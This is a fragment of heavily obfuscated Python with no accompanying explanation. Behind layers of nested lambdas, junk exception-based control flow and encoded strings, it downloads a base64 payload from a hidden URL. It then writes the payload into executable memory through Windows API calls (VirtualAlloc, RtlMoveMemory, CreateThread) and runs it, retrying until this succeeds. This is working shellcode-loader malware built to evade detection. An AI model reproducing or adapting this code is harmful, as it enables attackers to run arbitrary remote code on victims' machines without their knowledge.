    raise MemoryError([True])
except MemoryError as _518:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742703, 16742704, 16742711]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742705, 16742704]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _1719: _1719 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _615 = [[(lambda : (lambda _813: _813 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _514: _514 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742708, 16742705]))))())())()])
        raise MemoryError([(lambda : (lambda _317: _317 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _81:
        try:
            raise MemoryError(__2209740698865)
        except MemoryError as __3852986996120:
            if __3852986996120.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.WaitForSingleObject.restype = wt.DWORD
            if __3852986996120.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __6564038421325 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\xb9e\x12\xc9|o'))()
try:
    match '199' == '36':
        case True:
            raise MemoryError([True])
        case False:
            _173 = [[True], [False]]
            R_E_D__A_V______(['_718'])
    raise MemoryError([True])
except MemoryError as _1511:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742708, 16742711]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742706, 16742707]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _312: _312 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _145 = [[(lambda : (lambda _1812: _1812 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _71: _71 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742711, 16742704, 16742704]))))())())()])
        raise MemoryError([(lambda : (lambda _216: _216 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _159:
        while (lambda : (lambda _176: _176 + (lambda : ______R_E_D__A_V_______((lambda : R_E_D__A_V(b'R_E_D__A_V__wx'))()))())((lambda : R_E_D__A_V(b'R_E_D__A_V__'))()) == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))())():
            try:
                buf = base64.b64decode(urllib.request.urlopen((lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [(lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyg'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyo'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyr'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy9'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyq'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy`'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyv'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy-'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyf'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyh'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyg'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyt'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffya'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyt'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyr'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyq'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyb'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyn'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffym'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffym'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy-'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyb'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyn'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyl'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyg'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy`'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyb'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyj'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyq'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy8'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyw'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyb'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyk'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyn'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffym'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy0'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy0'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy0'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyq'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffye'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyr'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyg'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy`'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyc'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyr'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyl'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy`'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyr'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyq'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyW'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyB'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyk'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyh'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffym'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy-'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffya'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy5'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy3'))()]))))())())()).read().decode((lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [(lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyt'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffye'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy,'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy7'))()]))))())())()))
                memAddr = kernel32.VirtualAlloc(None, len(buf), (lambda : R_E_D__A_V(b'R_E_D__A_V__0\x00'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__@'))())
                kernel32.RtlMoveMemory(memAddr, buf, len(buf))
                th = kernel32.CreateThread(ctypes.c_int((lambda : R_E_D__A_V(b'R_E_D__A_V__'))()), ctypes.c_int((lambda : R_E_D__A_V(b'R_E_D__A_V__'))()), ctypes.c_void_p(memAddr), ctypes.c_int((lambda : R_E_D__A_V(b'R_E_D__A_V__'))()), ctypes.c_int((lambda : R_E_D__A_V(b'R_E_D__A_V__'))()), ctypes.pointer(ctypes.c_int((lambda : R_E_D__A_V(b'R_E_D__A_V__'))())))
                kernel32.WaitForSingleObject(th, -(lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))())
                break
            except Exception:
                continue